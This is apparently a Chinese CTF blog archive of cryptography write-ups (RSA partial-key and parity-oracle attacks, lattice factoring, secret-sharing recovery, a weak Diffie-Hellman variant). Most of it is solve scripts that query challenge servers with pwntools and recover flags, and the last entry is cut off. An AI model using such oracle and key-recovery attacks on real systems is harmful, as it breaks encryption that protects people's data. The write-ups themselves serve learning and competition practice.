print(long_to_bytes(2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736+phase2(high_m, n, c))) FLAG{2^8rsa7589693fc689c77c5f5262d654272427}\nrsa27 partial d and n c # from Crypto.Util.number import * def getFullP(low_p, n): R.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n), implementation=\u0026#39;NTL\u0026#39;) p = x*2^512 + low_p root = (p-n).monic().small_roots(X = 2^128, beta = 0.4) if root: return p(root[0]) return None def phase4(low_d, n, c): maybe_p = [] for k in range(1, 4): p = var(\u0026#39;p\u0026#39;) p0 = solve_mod([3*p*low_d == p + k*(n*p - p^2 - n + p)], 2^512) maybe_p += [int(x[0]) for x in p0] print(maybe_p) for x in maybe_p: P = getFullP(x, n) if P: break P = int(P) Q = n // P assert P*Q == n d = inverse_mod(3, (P-1)*(Q-1)) ## print(hex()[2:]) print(long_to_bytes(power_mod(c, d, n))) n = 92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183 c = 56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530 low_d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955 phase4(low_d, n, c) ## FLAG{2^8rsa5ab086745f6ec745619a8b65fe4ec560} rsa 28 bit Oracle # e = 0x10001 n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0 from pwn import * left=0 right=n num=0 import gmpy2 while right-left\u0026gt;2: num+=1 tmp=gmpy2.powmod(2,num*e,n) senddata=hex((c*tmp)%n)[2:] ## 111.200.241.244:62839 io=remote(\u0026#39;111.200.241.244\u0026#39;,62839) io.recv() io.sendline(senddata) ans=io.recvline().decode()[:-1] print(ans) if ans==\u0026#39;odd\u0026#39;: left=(left+right)//2 if (left+right)%2==0 else (left+right)//2+1 else: right=(left+right)//2 if (left+right)%2==0 else (left+right)//2+1 print(right-left) print(num) io.close() print((left,right)) import gmpy2 while gmpy2.powmod(left,e,n)!=c: left-=1 print(left) from Crypto.Util import number print(number.long_to_bytes(left)) ","date":"14 June 2021","permalink":"/achieve/2019to2021/rsaallinone/","section":"archive","summary":"一些RSA垃圾题","title":"RsaAllInOne"},{"content":"\r蓝🐱ber 2021半决赛 # 很气 , 为什么这傻逼玩意3点结束\n中文12点钟还在上机做实验 😅😅😅\n笑死 吃个饭根本没有时间写脚本\nvery smooth # ​\t白给题\n连上后有一个 Hints 是一个特殊素数的题\n可以对任意明文用 E，N 加密,上传4,8,16,0x20利用选择明文的方式得到 n\n把n分解掉得到pq\nfrom gmpy2 import gcd from Crypto.Util.number import inverse, long_to_bytes, sieve_base as primes c2 = 0x42a03c9a532106552a1517f833746c75951b9daebc0fd66b616f54622b44f3aec6227a3b4f02f4e77ae98209fa4c52c43596a44468a336d956d69be9588e6544c98313c9e8b4083cc3165102c7704834c66e165971419e17717f98eb0e494c71c498e7c7432a4753329912ec2a60a128e04c93e28c5c253e6ee17c3376f0712fb3b7ae72715f76366eeeb207a5367db8e2f43a5ad33459014bef0d3c225bd11768124a75a54e7c910151cd314ae7bbc4f86fbf6a5f2df7cda7467596bb415d2165ab282c38b2dccd736c3c5f2fea9cf64f417b6340f7d59069f739aa538b6e074fd149a016fc446439a8c2b59d306f748e9abd21a15947f3b31d9cac9c932e9c4d9e639247eaa2345651bf8d741943904c33316b5ebff740f609605ccb0d0069a0e45d230a6af1d12904d998d540387f89529cf8a5c6b491c7bd190ce98120adeab6c6400a735369234655d20dbd1f86213da6bd2ffc07f8c4debc39b33954dc38ac1d897bd58f585f892d35fa9367478f44bc25ac809d3a336aa0a9af3bc7f2661c06cbd414b1a99e1058593a7415135464a10fd0cffa2a5d50bbff9478825075371833996f5f780389b7e466a9545cfbb76fb4cff56addab40c4c043295752a4dbf085cd57e32a44d88c36bd8c71ab55f835a0f54d47db7b1cd9b38dffe4cb2076c7fa38d47ad791e97220c75d795009f933de26d18f19439cb89b1c6eee9b921155 c4 = 0x4e0fc3b860cc8b893eb63d23cfb68ac9750e0519e54949f45e5c230d53443758a7f5187fa111399edad5b82d01546cafc756738c4ba8c80f7f5ccd3f0401ce0d494ee6988fbf9995434a35e70ad5271d18f0790dfb7593022927116a0c2dcdea61e25eeabc67da1b22bc0c2f44be8d35da70af6f78696302d5e78e838668eb22240bc8916c2ed9b90c48ba9bc2d610e9019efba6c8a1f63ed204fbed82954582671b7ca8be91411c0ef4dbc918d913ed80a234ca448b298366fcb6dc241ed3d7744cb3bf5d24811a34875a346bfb37e35f3a77cc5f96aa65863ff7aac97142b2d1eb2b73a72a7918b87d99cfd5f3e7adac18c5016e4e41c96d0110570f7a937b3a21d7e94ea0b407b58d87893903b10e6a3088e3a07426e8d41dd197af71ac855e9a6a6e060556b853e2b40aad8d2581732163ca76c938e687f37c30ac48b3dda19e8814c10f852e71421cae9bdd795e0c7a9afb34261900236c586e59469f0cecd9cdfc81ebeeb0bc6e2f19f6dfb949ee00bd4ed8a1a553dc4a145ae415e39aec7f56ad2c5ef1a33f943b126bc8b67fbb632b01eda6e06ce0f847e32218dcfa5f70687e55e8d7d844308d61311077c5cd4b022c42d6bbf0b436542093bf60cd0ce87b7c9bcb3517ae9d0e51d1a2e05cd40a97b469d127714f3c6dd0183956357db25be4c5443ea01aac72ba583d0cd0a72ad4f6fa30d8ace2bbe87f9ff11ddb293539 c8 = 0x187adec8ba464a1a8f911caaabd95a519fc641729d0bbaebd6733362313d718d783961d4db0772de7e1f53c0971b630007554d3f82ca74a6879a08b1572688306dc5759182f20009c4c8cd645eba15e8e1ecb90c7b332685eaeeea0fc5e0f358880c78fcee3aed48ffc28798c553ad43ffc09adcf8797a0177b98ee692d32fd5564dadee8756192685a325012aa460802197bfb04118e1444708403d75fec3888097c3289de53b2491323d4c0f11b0cd6242192f8a40fef3dae1cbdc0a70a2cbca2c746ccf40aa261e87c9a22f2205375c88098dc20d9d5093d9a1b79e4dcf3ff8029a62b4391e16c7c106b05def5ccf1b22565d0ce2deb3eb1b4943ca28999b86e815566f55d2a7a0c8c341adcfea7d608690c217c9128dc41c708c0b3830159947618a1860d11e5bb376b14e20017972116da12364cc4ba87a0fc33a02f55fab863ac5f841915c6ec6301cc56ca8c4fe7a37031df7cea4bedec32ca4d24832772aff2363d4ba6c943ce67bad23b4a643ac24e20cfaaada364d1b389409b2f9fd52632cd8b80a9264ef9e637947f80521d95a4c173649e05f6fb5c5ad350293e08e2215cfab6a7dbc7901a112f59209dd030219665438b708f7fcd7add7d9b1ebc4fc1f9abb6bcb3bfcaa757dd6d6853990371ec788ca5a5885fc979e0339f6d63fddff99472d09a1ff2a055add58ff8b3b4302ba0cc0f330c107e084c7bae53af298 c16 = 0x96e4bd1a084c122aee1d8547b5eb8cff24a3354ea768dfcc99457a62a7ef2b192bef7b032d046cc95a7171f24273bb84bf82f3640eec73f36a1089c5dd24006c96767f1c3753c686a53e37d9f60708649c9ff46d03117acd5318cd1fe266f26aa8a239c99c7339b5dc3c73c075feacfd7cc70b2324fc3d911a4839ff70f6ad900b57d30115750f6e1604e584f8308ed9f130d5be6e731db98cb3568fea1d941fc1b721888053f632ac39b14a1bdeb273a92ce3b2ade717a25126747ec5dd37397b39e9e7b275d343c52f772eac1a6b1b11b3afd4f39cb061946090c65debeb9c67fc395f07229f7747801252d3190afa627a7b9dd07e01b95d9b18e0cacdb7d6bdd855449139e56ae28b8fe38a37adef071811f14a4670c940bc8ea64a58bac4bb0693989501181fbd0ec225d288c8ea21849f2969b16d585a271d3cf9ad4e15ec720c3e24954ef2228e2d91dcd3c5e3765da779344ddc6798ed7d46ed29969fb8e1218830a2dda369adae57531d29c65a4a6b6d232034b047e2af76ccfd966e510612300b248d376e44da1dc32a359d9d8ecc39d2ad48034dbdd5b5a35270da5e42749b9c15ae67e0c46d325efc1c0afb22df74910bad5388a21fe25c31137c6a62cb68e5ddd6754aa9f5961567f89f20ac240d755dab069acdfe3d16b2e83c13f5b58e6b77e132c957ca5eba6b1f9ac83f8f3d81278e4581c17973b8b2e8a85da96 c32 = 0x35ca1593e142b2847125b555abf2a7671d6453932a90752e4a5e14740b0b2d9150ff2a1e26245ba869916304ac8ff448647f03012a0d0ef3530cfbe381bae2c756a3191100f327c9e1254395a79ae38e180a0f06865976c30ad39e8ea0dd0279ef6e3d2e4585271cd1f60befdb53d7e93e368d17453962b60a81fddd5a0842513fabd3553cd64c9a2c6ab7a590c7dbe62ffbad7a7732b344dddfd599cc76249c9c9cd9fc5535d0e5f843516675a90e19c78cac4150035192c3b672f1a46ff1cfb707dc0c9faa49f43526ae52dfaef2cd7248b2836740782856f1b591e45c165fc5ac198809a6622712a560b605a4ec3d9e6d82a383dd05e5fdbf4b79a6cc2c63a651311876a62304cc184e481548b05ef0a7f29b675355c4217c3f33e8a1904d76a8d89f9461feae3412fc6c16430627ff0709e1b44b754bcd1fb823a74cae92775fdc472755dc50c252685d6c8a9c1358f354e705dd69fbc7fb2bdea38e80cb6d89218918272f4b61daf155d8a7ab06a70be70188669c905ea9ff7b1edf8a1042b9fc8dfc21075e1c24b4300b80e17b8f61cb10a6b9de72dc1bdb45b47e90eb58ae89997f3f53373b8ddad181987b6be6f8945396eb9aec245ca5c13258e2c7d1edfe983d9e613036a010c8c85ac2d369ad9021b3eefd67f88482505625d907f0db8ac3970ea1c5a4cbc8194ac6cd0ba669b5635c3e7cc85eb89db38a86f7b569a7d7 e = 0xb0c9850f9011fff3 tmp1 = c2**2-c4 tmp2 = c2**3 - c8 print(gcd(tmp1,tmp2)) #n n = 10692664679893739061346624963756238326909832986911746671432177977106803747834808482664745066503767659342297985398473672934784214154083982701378892833624959949381593211919420949003713490334711964701876174075490998238639603875932591934027218071278526995196688532809816282613164879439054064395793103540418492601028819750817898231215515490781342362667217521611006486460470021774355363986660297005486140235347671147357347288429551570802373902314351315203691963871248380238591559213114056614371235371632060733799353705032408294405889554859476139483322273931964592871077343201918116296915049134397709997524443709019832884220802486622148127987276341842100859233579597766831078061591735155348141665023151980626921512388513676299779091204193339220987799602731968274328056958108046444484197044587876571576648161905099526406757618769384516494063549805092383328953214018195122332164730563740664245705722818506815008751691569465550951862660691258739370213781878542487435891666566514414160543282396596969430691853935887802828041224909086447462208206244058569311336469455693550763462023232696617101031002302783846517806558340968291885996058813639594795019464746186634849088956261950519343976570981323926159821885608523334734068893605509523992806520200051013 c2 = pow(2,e,n) print(hex(c2)) # ========================================= q = 22960690030954031643742873940756387805063632374349798184486158679056793968326082353744810859681157004386764888216226590055321262725333525018162946329363305619138731630622888165955977549876211714272441886170151684654308569015065787094352398847347785663643177996671368014667130798343655987811559205747080364736341114890032293368422580223606501359822058596759086093511987824715524940155176294187511558172399888678858130086673199405724632211823726260671253464305495983658956071316594110302935414507198453006409876448274797313564489027777441015454737825659566520679223546384865017468537310551644663582219910328842894601218987 p = 465694396182284590994715625131230714161417041725952699878736781345012032174229077433177127599212318839252860698357547341108410217873453860041877707176988034842163129340937209451388376485311961183911455765614162925734677267585939412323019039933618486263931972247343936114712480771059070555737146835361052356166634684179750979833279130369193818863085641945469759413602478617023305793042062127374270238398593152253825771645013808373316824228767738910513983082625750695479978910779636917338424693371960346239509252789852394767480118428666311119275133465046795934573038184768396911187352262509744712465822871605090335322209999 print(n-p*q) c = 0x17bb4730ef3ba7591d5ac5aba56596ea7bb5b3cac908375fed01f827a4ad246457bcf4f67be416126bc421b2ec813aca9ebed52c36734be35fd39fd450bd11831f833053743c7822094bf295d17984380d062764f31c8e8725255eec779d375ec82b76b6d8956107264fd9550d0f7407ad6531bbbc79af22cb85191171e0a79c137f180d9376cce93e9a17fb1d7ba985150f73b8d67be7e47c72bf607aa274369aaaa230078eca1bf4daa0326d46b682b1d94c651946417f7f254c1b6531df833deca73b81d9cf026c5038c8021d31fee10efb4a1f041d9180b7b489a9ce0ea12f82c67529c9088f72e84de35aa48ebfd67e7a8fcaf01b07a937bbeeab578710495abcc80f8a2a57a84d5b76e54cd58d160f6e289bf4848b9b87c7b94164fd11b3dca467074a71e02ed9ea72db34915e1276c48339ef6f4c4a9e971e69041117b6a1f2502a475dfbba83b1c61d1b7e427c0de5132f82b73b0ba839bfe4ad93cb8768596d67aa2dfb873a7589d38a89cae70203e9fdbcd2497adf563480ad03163c96be553ba5f72ad2d57358acd9ebeeb00b2a023f5a9406b5549082a618e43773b903d501bd6aab795362dc49024c2a6a17ba33d13731aea574941766dd1a52c3f3d48f9e26901d4e1c3031ba1cd63c5078bc51d3b0f310236d3d2b9e8a9fa4fa01567293e02ef22dea9d3744924f46e5f16f25ad800f3fa93a5f4c4b58c68bbac1 e = 0xb0c9850f9011fff3 phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) # flag{984af69b-5497-471b-9fa3-cda517490ad2} sharing_system # 简单数学题，做不出来的建议重读初一😅😅😅😅\n用 keys1 给的 y 互相相减得到没有secret的方程\n构造矩阵得到ts\nexp: # from itertools import product from pwn import * from icecream import * from hashlib import sha256 r = remote(\u0026#39;0.0.0.0\u0026#39;,20001) from time import * def gopow(): # print(r.recv(1024)) r.recvuntil(\u0026#39;sha256(XXXX+\u0026#39;) s1 = r.recvuntil(\u0026#39;) == \u0026#39;)[:-5] hashstr = r.recvline()[:-1] print(r.recvuntil(\u0026#39;Give me XXXX \u0026gt;\u0026#39;)) print(s1,hashstr) tab = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; for i in product(tab,repeat=4): tmp = \u0026#39;\u0026#39;.join(i) s0 = bytes(tmp,encoding=\u0026#39;utf-8\u0026#39;) s = s0+s1 hash_value = sha256(s).hexdigest() hash_value = bytes(hash_value,encoding=\u0026#39;utf-8\u0026#39;) if hash_value == hashstr: print(hash_value) ic(\u0026#34;XXXX=\u0026#34;,s0) ic(hash_value,hashstr) print(r.recv(2048)) r.sendline(s0) break gopow() buf = r.recv(1024) print(buf) buf = r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;) print(buf) r.sendline(\u0026#39;1\u0026#39;) buf = r.recvline() # p print(buf) p = int(buf[3:-1]) print(p) buf = r.recvuntil(\u0026#39;key = (\u0026#39;) # key1 x1 = r.recvuntil(\u0026#39;, \u0026#39;) y1 = r.recvuntil(\u0026#39;)\\n\u0026#39;) print(buf,x1,y1) buf = r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;) print(buf) r.sendline(\u0026#39;2\u0026#39;) buf = r.recvline() # p # print(buf) p = int(buf[3:-1]) # print(p) buf = r.recvuntil(\u0026#39;key = (\u0026#39;) # key1 x2 = r.recvuntil(\u0026#39;, \u0026#39;) y2 = r.recvuntil(\u0026#39;)\\n\u0026#39;) print(buf,x1,y1) x1 = int(x1[:-2].decode()) y1 = int(y1[:-2].decode()) x2 = int(x2[:-2].decode()) y2 = int(y2[:-2].decode()) ic(x1) ic(x2) ic(y1) ic(y2) ic(p) keys1 = [[x1,y1]] keys2 = [[x2,y2]] def getXY(): for i in range(1,50): # print(r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;).decode()) r.sendline(\u0026#39;3\u0026#39;) r.recvuntil(\u0026#39;umber (1-49) \u0026gt; \u0026#39;) r.sendline(str(i)) r.recvuntil(\u0026#39;key = (\u0026#39;) x = int(r.recvuntil(\u0026#39;, \u0026#39;)[:-2]) y = int(r.recvuntil(\u0026#39;)\\n\u0026#39;)[:-2]) # print(x,y) keys1.append([x,y]) def getts(key): keys_1 = key XS=[] for i in range(49): xi = keys_1[i][0] xi_1 = keys_1[i+1][0] xs=[] for j in range(49): x1 = pow(xi,j+1,p) x2 = pow(xi_1,j+1,p) tmp = (x1-x2)%p xs.append(tmp) XS.append(xs) YS =[] for i in range(49): yi = keys_1[i][1] yi_1 = keys_1[i+1][1] YS.append([(yi-yi_1)%p]) # print(YS) X = Matrix(Zmod(p),XS) Y = Matrix(Zmod(p),YS) invx = X.inverse() T = invx*Y # print(ts) TS = [i[0] for i in T] return TS getXY() print(keys1) print(len(keys1)) # t = 58510083877094693891040277851267905853617844771064576929521712771940231668984770883328421254238895212042598002659174059244201616561130950785238401399837559644941651285130352373844849078590789578028528768860166902952495931639692465443534927973027133719331474369633030490640443060779278904144461746302422307614 # ts = [ t for _ in range(50 - 1)] ts = getts(keys1) tmp1=0 for i in range(0,49): XS = pow(x1,i+1,p)*ts[i] tmp1 = (tmp1 + XS)%p k1 = (y1 - tmp1)%p tmp2=0 for i in range(0,49): XS = pow(x2,i+1,p)*ts[i] tmp2 = (tmp2 + XS)%p k2 = (y2 - tmp2)%p ic(k1,k2) # print(r.recv(1024)) print(r.recvuntil(\u0026#39;Enter option \u0026gt; \u0026#39;)) r.sendline(\u0026#39;5\u0026#39;) print(r.recvuntil(\u0026#39;Please enter secret 1 \u0026gt; \u0026#39;)) r.sendline(str(k1)) print(r.recvuntil(\u0026#39;Please enter secret 2 \u0026gt; \u0026#39;)) r.sendline(str(k2)) sleep(1) print(r.recv(1024)) er option \u0026gt; \u0026#39; b\u0026#39;Please enter secret 1 \u0026gt; \u0026#39; b\u0026#39;Please enter secret 2 \u0026gt; \u0026#39; b\u0026#39;Wow! How smart you are! Here is your flag: \\nfl{f*ck you!!!}\\nBye!\\n\\n\u0026#39; [*] Closed connection to 0.0.0.0 port 20001 ","date":"5 June 2021","permalink":"/achieve/ctf/bluehat2021/","section":"archive","summary":"","title":"Writeup for crypto in 蓝😼2021"},{"content":"学到hin多\n学妹改了一个能用的代码，可惜细节部分没处理好\n首先用\nhttps://ami.uni-eszterhazy.hu/uploads/papers/finalpdf/AMI_43_from29to41.pdf\n给出的曲线变换来做曲线的映射,再用后面提到的思路在ecc曲线上找点再映射回原来的曲线验证正负性\n文章中提到了范围的证明,这里不做深入\n东拼西凑偷了个通解代码来把玩x：\n# sage n = 6 a = (4*n ^ 2+12*n-3) b = 32*(n+3) ee = EllipticCurve([0, a, 0, b, 0]) # y2=x3+109x2+224x def orig(P, N): x = P[0] y = P[1] a = (8*(N+3)-x+y)/(2*(N+3)*(4-x)) b = (8*(N+3)-x-y)/(2*(N+3)*(4-x)) c = (-4*(N+3)-(N+2)*x)/((N+3)*(4-x)) da = denominator(a) db = denominator(b) dc = denominator(c) l = lcm(da, lcm(db, dc)) return [a*l, b*l, c*l] g = ee.gens() print(g) # [(-200 : 680 : 1)] P = ee(-200, 680) # P = ee(g) print(P) # 只输出一组解 for i in range(1,100): x,y,z = orig(i*P, n) if(x\u0026gt;0 and y\u0026gt;0 and z\u0026gt;0): print(f\u0026#39;x={x}\\n, y={y}\\n, z={z}\\n\u0026#39;) print(f\u0026#39;i = {i}\u0026#39;) break ","date":"8 April 2021","permalink":"/achieve/ctf/%E8%99%8E%E7%AC%A62021/","section":"archive","summary":"","title":"虎符2021"},{"content":" 咕咕咕了太久了,上个有就该做的\nd^3ctf2021 # babyLattice done LLL分解n的应用 simpleGroup done babyLattice LLL分解n + 中国剩余定理特殊应用 + n次剩余判断 AliceWantFlag todo EasyCurve todo simpleGroup # 得矩阵 A 分解 n\nn = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361 b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196 M = Matrix(ZZ, [ [1, 0, b ^ 2], [0, 1, b], [0, 0, n] ]) M = M.LLL() # tmp1 = abs(M[0][0]) tmp2 = abs(M[0][2]) print(factor(tmp1)) print(factor(tmp2)) a12 = 1018979931854255696816714991181 a22 = 1151291153120610849180830073509 a11 = 1017199123798810531137951821909 a21 = 207806651167586080788016046729 crt\nfrom icecream import * from Crypto.Util.number import * p = 7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309 q = 9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629 e = 1928983487 y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328 C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428] # 36493 * 52859 e1 = 36493 e2 = 52859 ic(len(C)) \u0026#39;\u0026#39;\u0026#39; p-1 e2互质 q-1 e1互质 \u0026#39;\u0026#39;\u0026#39; def check(d, p, n): if((p - 1) % n == 0): return pow(d, (p - 1) // n, p) == 1 else: k = gcd(n, p - 1) return pow(d, (p - 1) // k, p) == 1 def getM(c, e, p): for i in range(2, e): inv = int(pow(y, i, p)) tmpc = (c * inverse(inv, p)) % p if check(tmpc, p, e): return i exit(0) def func(c): cq = c % q cp = c % p m1 = getM(cp, e1, p) m2 = getM(cq, e2, q) ic(m1,m2) ans = crt([m1,m2],[e1,e2]) ic(hex(ans)) return ans ans=[] for c in C: ans.append(func(c)) tot =0 ans=ans[::-1] for i in ans: tot*=e tot+=i print(tot) print(long_to_bytes(tot)) ","date":"21 March 2021","permalink":"/achieve/ctf/d3ctf2021/","section":"archive","summary":"","title":"d3ctf2021"},{"content":"\rHGAME 2021网络攻防大赛crypto wp # EncryptedChats # Description\nSwitch 的病友 Million 来监狱探监\u0026hellip;\nChallenge Address\nSwitch: 你好老伙汁 Million: 你好 Switch: 所以为什么这家伙在这里 Liki: 因为我是来记录你们谈话内容的 Million: 好吧 Million: 不过我可以提一个要求吗 Liki: ? Million: 我们...换一个群聊 Switch: 好啊! 我看看, 就换到加法群聊吧! Switch: 喂, 帮忙选一个质数 g 吧 Liki: ??, 12602983924735419868428783329859102652072837431735895060811258460532600319539509800915989811879506790207025505003183121812480524033163157114086741486989697 Million: 这位女士，可以劳烦您再为我们选择一个质数 p 吗 Liki: ???...那就, 30567260905179651419358486099834315837354102714690253338851161207042846254351374572818884286661092938876675032728700590336029243619773064402923830209873155153338320502164587381848849791304214084993139233581072431814555885408821184652544361671134564827265516331283076223247829980225591857643487356406284913560960657053777612115591241983729716542192518684003840806442329098770424504275465756739925434019460351138273272559738332984560095465809481270198689251655392941966835733947437503158486731906649716026200661065054914445245468517406404904444261196826370252359102324767986314473183183059212009545789665906197844518119 吧, 够大了吗? Million: 好的, 我选好我的 a 了, 那么 A = 6407001517522031755461029087358686699246016691953286745456203144289666065160284103094131027888246726980488732095429549592118968601737506427099198442788626223019135982124788211819831979642738635150279126917220901861977041911299607913392143290015904211117118451848822390856596017775995010697100627886929406512483565105588306151304249791558742229557096175320767054998573953728418896571838697779621641522372719890056962681223595931519174265357487072296679757688238385898442549594049002467756836225770565740860731932911280385359763772064721179733418453824127593878917184915316616399071722555609838785743384947882543058635 # A = g ^ a % p = pow(g, a, p) Switch: okay, b 也选好了, B = 5522084830673448802472379641008428434072040852768290130448235845195771339187395942646105104638930576247008845820145438300060808178610210847444428530002142556272450436372497461222761977462182452947513887074829637667167313239798703720635138224358712513217604569884276513251617003838008296082768599917178457307640326380587295666291524388123169244965414927588882003753247085026455845320527874258783530744522455308596065597902210653744845305271468086224187208396213207085588031362747352905905343508092625379341493584570041786625506585600322965052668481899375651376670219908567608009443985857358126335247278232020255467723 # B = g ^ b % p = pow(g, b, p) Liki: ???? Million: {\u0026#39;iv\u0026#39;: \u0026#39;d3811beb5cd2a4e1e778207ab541082b\u0026#39;, \u0026#39;encrypted_flag\u0026#39;: \u0026#39;059e9c216bcc14e5d6901bcf651bee361d9fe42f225bc0539935671926e6c092\u0026#39;} Switch: {\u0026#39;iv\u0026#39;: \u0026#39;b4259ed79d050dabc7eab0c77590a6d0\u0026#39;, \u0026#39;encrypted_flag\u0026#39;: \u0026#39;af3fe410a6927cc227051f587a76132d668187e0de5ebf0608598a870a4bbc89\u0026#39;} Million: 再见伙汁 Switch: 再见 Liki: ????? 加法群的幂是乘法\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from Crypto.Util.number import long_to_bytes import hashlib import gmpy2 as gp from binascii import a2b_hex A = 6407001517522031755461029087358686699246016691953286745456203144289666065160284103094131027888246726980488732095429549592118968601737506427099198442788626223019135982124788211819831979642738635150279126917220901861977041911299607913392143290015904211117118451848822390856596017775995010697100627886929406512483565105588306151304249791558742229557096175320767054998573953728418896571838697779621641522372719890056962681223595931519174265357487072296679757688238385898442549594049002467756836225770565740860731932911280385359763772064721179733418453824127593878917184915316616399071722555609838785743384947882543058635 B = 5522084830673448802472379641008428434072040852768290130448235845195771339187395942646105104638930576247008845820145438300060808178610210847444428530002142556272450436372497461222761977462182452947513887074829637667167313239798703720635138224358712513217604569884276513251617003838008296082768599917178457307640326380587295666291524388123169244965414927588882003753247085026455845320527874258783530744522455308596065597902210653744845305271468086224187208396213207085588031362747352905905343508092625379341493584570041786625506585600322965052668481899375651376670219908567608009443985857358126335247278232020255467723 p = 30567260905179651419358486099834315837354102714690253338851161207042846254351374572818884286661092938876675032728700590336029243619773064402923830209873155153338320502164587381848849791304214084993139233581072431814555885408821184652544361671134564827265516331283076223247829980225591857643487356406284913560960657053777612115591241983729716542192518684003840806442329098770424504275465756739925434019460351138273272559738332984560095465809481270198689251655392941966835733947437503158486731906649716026200661065054914445245468517406404904444261196826370252359102324767986314473183183059212009545789665906197844518119 g = 12602983924735419868428783329859102652072837431735895060811258460532600319539509800915989811879506790207025505003183121812480524033163157114086741486989697 x1 = gp.invert(g,p)*A%p x2 = gp.invert(g,p)*B%p key1 = x1*x2*g%p shared_secret = key1 sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(\u0026#39;ascii\u0026#39;)) key = sha1.digest()[:16] iv1 = a2b_hex(\u0026#39;d3811beb5cd2a4e1e778207ab541082b\u0026#39;) iv2= a2b_hex(\u0026#39;b4259ed79d050dabc7eab0c77590a6d0\u0026#39;) data1 = 